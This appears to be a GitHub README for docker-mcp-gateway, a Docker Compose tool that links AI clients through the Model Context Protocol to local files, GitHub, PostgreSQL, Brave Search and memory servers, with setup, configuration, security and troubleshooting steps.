# 🌐 docker-mcp-gateway - Connect your AI to private data

[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/waynestimulative605/docker-mcp-gateway)

This software lets you connect AI models to your local files, databases, and web search tools. It acts as a bridge between your preferred AI interface and various data sources. You get a single address for all your connected tools.

## 📋 What this tool does

The gateway manages multiple connections at once. It uses the Model Context Protocol to talk to servers like GitHub, PostgreSQL, and local folders. You manage your setup through a text file. It works on both standard desktop computers and high-performance server chips.

## 💻 Requirements

To run this tool, ensure your system meets these needs:

*   **Operating System**: Windows 10 or Windows 11 with WSL2 enabled.
*   **Docker Desktop**: You must install Docker Desktop for Windows.
*   **Memory**: At least 4GB of RAM is requested for smooth operation.
*   **Storage**: 1GB of free space.
*   **Network**: A stable internet connection for fetching updates and data.

## 🚀 How to set up

1.  **Install Docker Desktop**: Go to the official Docker website. Download and install Docker Desktop for Windows. Restart your computer after installation.
2.  **Enable Features**: Ensure the WSL2 feature is active in Docker Desktop settings.
3.  **Visit the repository**: You need to fetch the configuration files. [Visit this page to download](https://github.com/waynestimulative605/docker-mcp-gateway) the latest files from the official repository.
4.  **Extract files**: Create a new folder on your computer. Extract the contents of the zip file into this folder.
5.  **Configure settings**: Find the file named `.env` in the folder. Open it with Notepad. Enter your security token and select which tools you want to use. Save the file.
6.  **Start the gateway**: Open your command terminal. Move to the folder where you saved the files. Type `docker-compose up -d` and press Enter.

## 🛠 Using the gateway

Once the containers start, the gateway listens for requests on your local network. You point your AI application to the URL provided in your configuration. The gateway handles the authentication for you using your Bearer token. 

If you need to change your setup, edit the `.env` file again. You must run `docker-compose restart` for the changes to take effect. If something stops working, run `docker-compose logs` in the terminal to see what happened.

## ⚙️ Configuration details

The system uses a central hub to talk to different components. You define these components in your configuration file.

*   **Filesystem**: Connects local folders to the AI for reading and writing documents.
*   **GitHub**: Allows the AI to search your code repositories.
*   **PostgreSQL**: Lets the AI query your databases.
*   **Brave Search**: Gives the AI access to live internet information.
*   **Memory**: Stores context for longer conversations.

Each component has a specific section in the configuration. Use the provided template to enable or disable these tools. Do not modify the underlying system components unless necessary.

## 🛡 Security considerations

The gateway uses a Bearer token to prevent unauthorized access. Keep this token private. Anyone with this token can access the data sources you connect to the gateway. Store your configuration file in a folder that is not shared with public users. Update the Docker images regularly to ensure you have the latest security patches.

## 📈 Performance tips

If the gateway runs slowly, check the resource limits in Docker Desktop. Allocate at least two processor cores to the Docker engine. If you connect large databases, the search speed might decrease. Limit the number of active tools to only those you need for immediate work. 

## 📝 Troubleshooting

*   **Container not starting**: Check if Docker Desktop is running. Look at the terminal for error messages.
*   **Connection refused**: Check the port numbers in your config file. Ensure no other application uses the same ports on your machine.
*   **Authentication errors**: Ensure the Bearer token matches the key defined in your environment file.
*   **Missing data**: Verify the folder paths provided in the config file. Use absolute paths to avoid confusion.

## 🏢 Support

The community maintains this project. If you encounter issues, check the issues tab on the repository page. Search for similar problems before opening a new ticket. Provide your error logs and a description of your setup when requesting help. Keep your reports direct to help others diagnose the issue faster. Documentation updates occur frequently. Check back on the GitHub page periodically for guidance on new features or changes.